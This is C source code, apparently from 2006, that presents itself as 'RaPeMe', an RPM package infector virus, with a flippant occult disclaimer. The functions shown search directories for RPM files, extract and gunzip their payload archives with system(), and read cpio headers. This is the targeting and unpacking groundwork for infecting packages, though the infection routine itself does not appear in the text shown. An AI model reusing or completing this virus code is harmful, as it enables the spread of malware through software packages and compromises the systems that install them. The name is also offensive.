/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : intestinal.cancer@hotmail.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include "hunt.h"

char *global_buf;
char target_name[FILENAME_MAX];

/*===== 
	find rpm in the given directory
=====*/
FILE *search_target(char *path,int path_size)
{	
	struct dirent **file_list;
	struct stat *buf; 
	int n,new_path_size;
	char *new_path;
	FILE *target;
	unsigned char magic_stuff[8];		/* magic,version,type*/ 

	buf = malloc(sizeof(struct stat));
	if(!buf) {
		perror("malloc");
		exit(1);
	}
	memset(buf,0,sizeof(struct stat));

	if(stat(path,buf) < 0) {
		perror("stat");	
		printf("%s\n",path);
		exit(1);
	}

	n = scandir(path,&file_list,0,alphasort);
	if(n < 0) {
		perror("scandir");
		exit(1);
	} 
	else {
		while(n--) {
			/* generate the new path */ 
			new_path_size = path_size + file_list[n]->d_reclen;
			new_path = malloc(new_path_size);
			if(!new_path) {
				perror("malloc");
				exit(1);
			}

			memset(new_path,0,new_path_size);
			strncpy(new_path,path,path_size);
			new_path[path_size] = '/';
			strncat(new_path,file_list[n]->d_name,file_list[n]->d_reclen);

			if(stat(new_path,buf) < 0) {
				perror("stat");
				printf("%s\n",new_path);
				exit(1);
			}

			/* regular file, check the magic number */
			if(S_ISREG(buf->st_mode)) {
				target = fopen(new_path,"r");
				if(!target) {
					perror("fopen");
					exit(1);
				}
				
				fgets(magic_stuff,sizeof(magic_stuff),target);
				rewind(target);
				
				/* further improvement: add a check for already infected files */
				if(magic_stuff[0] == 0xed && magic_stuff[1] == 0xab &&
				magic_stuff[2] == 0xee && magic_stuff[3] == 0xdb &&
				magic_stuff[6] == 0x00 && magic_stuff[7] == 0x00) {
					strncpy(target_name,new_path,new_path_size);
					free(file_list);
					free(new_path); 
					return target; 
				}
		
				else continue; 

			}
			
			free(file_list[n]);

		}

		free(file_list);
		free(new_path);

	}

//	return NULL;
	exit(1);

}
			

/*=====
	this is a modified version of rpmoffset.c from
	http://darkstar.ist.utl.pt/slackware/slackware-8.1/patches/source/bin/rpmoffset.c
	get the offset where the archive payload begins 
=====*/		  
unsigned long get_rpm_offset(FILE *rpm)
{
	char *buf,*eb,*p;			
	
	buf = malloc(RPM_BUF_SIZE);
	if(!buf) {
		perror("malloc");
		exit(1);
	}

	for(p = buf,eb = buf + read(fileno(rpm),buf,RPM_BUF_SIZE);p < eb;p++)
		if(*p == '\037' && p[1] == '\213' && p[2] == '\010')
			return (p - buf);

}


/*=====
	extract the archive payload from the rpm
	then gunzip it using system()
=====*/ 
FILE *get_rpm_archive(FILE *rpm,unsigned long rpm_offset)
{
	unsigned long rpm_size; 
	FILE *arch =  fopen(TMP_ARCHIVE_NAME_GZ,"w");
	if(!arch) {
		perror("fopen");
		exit(1);
	}

	fseek(rpm,0,SEEK_END);
	rpm_size = ftell(rpm);

	fseek(rpm,rpm_offset,SEEK_SET);

	while(rpm_size-- != 0)
		putc(getc(rpm),arch);
	
	fclose(arch);

	system(GUNZIP_ARCHIVE);

	arch = fopen(TMP_ARCHIVE_NAME,"r");

	return arch;

}
	

/*=====
	my buggy version of pow() 
=====*/
unsigned long my_pow(unsigned long a,unsigned long b)
{
	unsigned long t = 1;
	
	if(a == 0)
		return 0;
	if(a == 1)
		return 1;

	while(b-- > 0)
		t *= a;

	return t;

}


/*=====
	get specific informations from the cpio header
=====*/
unsigned long get_cpio_header_info(FILE *cpio,int header_offset,int info_size)
{
	char buf[info_size];
	int i,j,tmp[info_size];
	unsigned long tot = 0;

	fseek(cpio,header_offset,SEEK_SET);
	fgets(buf,info_size + 1,cpio);

	for(i = 0,j = info_size - 1;i < info_size,j != -1;i++,j--) {
		if(isalpha(buf[i]))
			tmp[i] = (buf[i] - 87) * my_pow(16,j);
		else
			tmp[i] = (buf[i] - 48) * my_pow(16,j);

		tot += tmp[i];

	}

	return tot;

}	


/*=====
	nothing to be said here
=====*/	
char *get_cpio_first_file_name(FILE *cpio,int file_name_len)
{
	global_buf = malloc(file_name_len);

	fseek(cpio,CPIO_FIRST_FILE_NAME_OFFSET,SEEK_SET);
	fgets(global_buf,file_name_len,cpio);

	return global_buf;

}
